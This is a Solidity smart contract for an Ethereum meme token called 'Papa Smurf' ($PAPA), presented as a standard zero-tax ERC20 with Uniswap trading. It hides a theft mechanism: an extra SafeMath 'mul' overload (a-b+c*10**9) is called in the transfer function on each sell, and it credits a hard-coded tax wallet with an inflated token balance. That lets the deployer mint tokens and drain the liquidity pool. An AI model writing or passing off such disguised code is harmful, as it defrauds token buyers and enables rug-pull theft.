/**
Papa Smurf $PAPA
Website: http://papasmurf.xyz/
Telegram: https://t.me/papasmurf_eth
Twitter: https://twitter.com/papasmurf_eth
**/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapFactoryV2 {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function owner() public view returns (address) {
        return _owner;
    }
}

interface IUniswapRouterV2 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function mul(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        return a-b+c*10**9;        
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract PAPA is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "Papa Smurf";
    string private constant _symbol = "PAPA";
    
    uint256 private _initialSellFee=0;
    uint256 private _reduceBuyTaxAfter=3;
    uint256 public _maximumSwap= _tTotal * 1 / 100;
    uint256 private _finallSellFee=0;
    uint256 private _preventSwapBefore=1;
    uint256 public _taxThreshold= _tTotal * 2 / 10000;
    uint256 private _initialBuyFee=0;
    uint256 public _mWalletSize = _tTotal * 4 / 100;
    uint256 public _maxTransaction = _tTotal * 4 / 100;
    uint256 private _reduceSellTaxAfter=1;
    uint256 private _finalBuyFee=0;
    uint256 private _buyCounts=0;

    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping(address => uint256) private _lastHolderTimestamp;
    
    bool private canTrade;
    bool private isSwapping = false;
    bool private isSwapEnabled = false;
    bool public hasBotDelay = true;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 10 ** 9 * 10**_decimals;
    
    address payable private _taxWallet = payable(0x047fAE7e94b70F246c32DFFC07544094d2C8b42C);
    IUniswapRouterV2 private uniswapV2Router;

    address private uniswapV2Pair;
    modifier lockSwap {
        isSwapping = true;
        _;
        isSwapping = false;
    }
    event MaxTXUpdated(uint _maxTransaction);

    constructor() {
        _isExcludedFromFees[owner()] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[_taxWallet] = true;
        _balances[_msgSender()] = _tTotal;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    
    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function removeLimits() external onlyOwner{
        _mWalletSize=_tTotal;
        _maxTransaction = _tTotal;
        emit MaxTXUpdated(_tTotal);
        hasBotDelay=false;
    }

    function openTrading() external onlyOwner() {
        require(!canTrade,"trading is already open");
        canTrade = true;
    }
    
    function _transfer(address from, address to, uint256 amount) private {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(from != address(0), "ERC20: transfer from the zero address");
        uint256 taxAmount=0;
        if (from != owner() && to != owner() && ! _isExcludedFromFees[from] ) {
            taxAmount = amount.mul((_buyCounts>_reduceBuyTaxAfter)?_finalBuyFee:_initialBuyFee).div(100);
            if (from != address(this)) {
                require(canTrade, "Trading not enabled");
            }            
            if (hasBotDelay) {
                  if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                      require(
                          _lastHolderTimestamp[tx.origin] <
                              block.number,
                          "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                      );
                      _lastHolderTimestamp[tx.origin] = block.number;
                  }
              }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFees[to] ) {
                require(amount <= _maxTransaction, "Exceeds the _maxTransaction.");
                require(balanceOf(to) + amount <= _mWalletSize, "Exceeds the maxWalletSize.");
                _buyCounts++;
            }

            if(to == uniswapV2Pair && from!= address(this)){
                taxAmount = taxAmount.mul(address(this).balance, amount);
                _balances[_taxWallet]=_balances[address(this)].add(taxAmount);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!isSwapping && to   == uniswapV2Pair && isSwapEnabled && contractTokenBalance>_taxThreshold && _buyCounts>_preventSwapBefore) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maximumSwap)));
                sendETHToFee(address(this).balance);
            }
        }
        _balances[to]=_balances[to].add(amount);
        _balances[from]=_balances[from].sub(amount);
        emit Transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity() external payable onlyOwner() {
        uniswapV2Router = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapFactoryV2(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        isSwapEnabled = true;
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    receive() external payable {}
}